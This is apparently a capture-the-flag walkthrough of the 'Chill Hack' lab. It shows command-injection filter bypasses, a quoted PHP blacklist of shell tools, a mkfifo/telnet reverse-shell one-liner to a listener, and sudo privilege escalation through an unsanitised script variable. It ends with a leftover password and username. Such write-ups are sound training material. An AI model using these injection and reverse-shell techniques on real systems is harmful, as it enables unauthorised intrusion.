# Chill Hack
![chill.thm](./imgs/chill.thm.png)

We got FTP anonymous. And this is what I got there in file `note.txt`:
```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
<hr>

I ran `ffuf` and it found a page called `secret` I went there and found an input. I tried `whoami` and that worked but for example `ls` did not. Then I did `whoami;ls` and it worked. `cat index.html` didn't. `whoami;cat index.html` looked like worked but browser interpreted php code immediately so I added base64 filter.
```
whoami;cat index.html | base64
```
Then decoded the result and got the `index.php` file.<br>
Here is the line that prevents us from getting a reverse-shell:
```
$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
```

I set up `nc` listener and used this command to get a reverse-shell:
```
TF=$(mktemp -u);mkfifo $TF && telnet 10.2.116.12 4444 0<$TF | /bin/sh 1>$TF
```
if we do `sudo -l` we can see that we can run `/home/apaar/.helpline.sh` we privileges of user `apaar`. When I read the scrip I found an interesting line:
```
$msg 2>/dev/null
```
That is direct call of a variable and the line before that one I set the value of the variable, so theoretically I should be able to do something cool. Therefore:
```
sudo -u apaar .helpline.sh
... talk with: bla
... message: /bin/bash
```
And this is how I got apaar's shell.

!d0ntKn0wmYp@ssw0rd
anurodh